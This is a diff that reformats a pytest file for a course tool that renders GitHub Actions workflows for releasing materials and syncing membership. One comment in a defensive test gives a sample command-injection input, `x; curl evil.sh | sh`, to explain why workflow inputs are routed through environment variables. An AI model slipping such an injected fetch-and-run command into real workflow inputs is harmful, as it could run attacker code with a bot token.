@@ -8,8 +8,8 @@ from __future__ import annotations
 
 import pytest
 import yaml
-
 from conftest import workflow_inputs, workflow_jobs
+
 from dsl_course import (
     discovery,
     profile_readme,
@@ -167,13 +167,21 @@ def test_sync_membership_is_a_consolidated_reconcile():
     inp = workflow_inputs(rendered)
     assert set(inp) == {"cohort_org"}
     assert inp["cohort_org"]["default"] == workflows_render._FACULTY_ONLY
-    assert inp["cohort_org"]["options"] == [workflows_render._FACULTY_ONLY, "Cohort-f2026"]
+    assert inp["cohort_org"]["options"] == [
+        workflows_render._FACULTY_ONLY,
+        "Cohort-f2026",
+    ]
     assert "dsl_course.sync_membership" in rendered
     assert "--prune" not in rendered
     jobs = workflow_jobs(rendered)
     assert {"check-team", "sync-dispatch", "sync-auto"} <= set(jobs)
     trigger = yaml.safe_load(rendered).get("on", yaml.safe_load(rendered).get(True))
-    assert set(trigger) == {"push", "repository_dispatch", "schedule", "workflow_dispatch"}
+    assert set(trigger) == {
+        "push",
+        "repository_dispatch",
+        "schedule",
+        "workflow_dispatch",
+    }
 
 
 def test_dotgithub_readme_orients_faculty():
@@ -220,7 +228,12 @@ def test_both_release_buttons_take_exactly_a_deploy_entrys_fields(rendered):
     assert "comma-separated" in inp["course_source_path"]["description"]
     # Gone with the section machinery: no per-section checkboxes, no session list, no
     # root-files toggle, no cohort_repo dropdown.
-    for retired in ("sessions", "include_root_files", "cohort_repo", "release_lectures"):
+    for retired in (
+        "sessions",
+        "include_root_files",
+        "cohort_repo",
+        "release_lectures",
+    ):
         assert retired not in inp
 
 
@@ -267,7 +280,10 @@ def test_central_button_offers_the_orgs_content_repos_as_the_source_dropdown():
         )
     )
     assert inp["course_source_repo"]["type"] == "choice"
-    assert inp["course_source_repo"]["options"] == ["course-materials-f2026", "lecture-code"]
+    assert inp["course_source_repo"]["options"] == [
+        "course-materials-f2026",
+        "lecture-code",
+    ]
     assert "default" not in inp["course_source_repo"]
 
 
@@ -277,14 +293,24 @@ def test_content_repos_get_both_buttons_and_lose_the_retired_one(monkeypatch):
     # Release materials takes any path.
     pushed, deleted = {}, []
     monkeypatch.setattr(
-        seed, "put_file", lambda org, repo, path, content, msg: pushed.setdefault(path, content.decode())
+        seed,
+        "put_file",
+        lambda org, repo, path, content, msg: pushed.setdefault(path, content.decode()),
     )
-    monkeypatch.setattr(seed, "delete_file", lambda org, repo, path, msg: deleted.append(path))
-    seed._push_workflows("Course", "course-materials-f2026", ["Cohort-f2026"], ["assignment-1-f2026"])
-    assert set(pushed) == set(seed.WORKFLOWS) == {
-        ".github/workflows/release-materials.yml",
-        ".github/workflows/release-assignment.yml",
-    }
+    monkeypatch.setattr(
+        seed, "delete_file", lambda org, repo, path, msg: deleted.append(path)
+    )
+    seed._push_workflows(
+        "Course", "course-materials-f2026", ["Cohort-f2026"], ["assignment-1-f2026"]
+    )
+    assert (
+        set(pushed)
+        == set(seed.WORKFLOWS)
+        == {
+            ".github/workflows/release-materials.yml",
+            ".github/workflows/release-assignment.yml",
+        }
+    )
     assert deleted == [".github/workflows/release-code.yml"]
     # The materials button seeded into a content repo is that repo's own variant.
     materials = yaml.safe_load(pushed[".github/workflows/release-materials.yml"])
@@ -322,7 +348,10 @@ def test_scaffold_buttons_route_inputs_through_env_not_the_shell():
     # GitHub substitutes ${{ inputs.x }} BEFORE the shell parses the run block, so a tag
     # like `x; curl evil.sh | sh` would execute in a runner holding DSL_BOT_TOKEN. Every
     # user-supplied input must reach the script as an env var instead.
-    materials, assignment = workflows_render.render_new_materials(), workflows_render.render_new_assignment()
+    materials, assignment = (
+        workflows_render.render_new_materials(),
+        workflows_render.render_new_assignment(),
+    )
     for rendered in (materials, assignment):
         step = workflow_jobs(rendered)["scaffold"]["steps"][-1]
         assert "${{" not in step["run"]
@@ -335,7 +364,10 @@ def test_bootstrap_org_workflow_routes_inputs_through_env_not_the_shell():
     from pathlib import Path
 
     wf = (
-        Path(__file__).resolve().parents[1] / ".github" / "workflows" / "bootstrap-org.yml"
+        Path(__file__).resolve().parents[1]
+        / ".github"
+        / "workflows"
+        / "bootstrap-org.yml"
     ).read_text()
     step = yaml.safe_load(wf)["jobs"]["bootstrap"]["steps"][-1]
     assert "${{" not in step["run"]
@@ -376,7 +408,9 @@ def test_classroom_config_site_dispatcher_fires_on_schedule_or_people_change():
 
     tmpl = (
         Path(__file__).resolve().parents[1]
-        / "templates" / "classroom-config" / "dispatch-sync-site.yml"
+        / "templates"
+        / "classroom-config"
+        / "dispatch-sync-site.yml"
     ).read_text()
     doc = yaml.safe_load(tmpl)
     trigger = doc.get("on", doc.get(True))
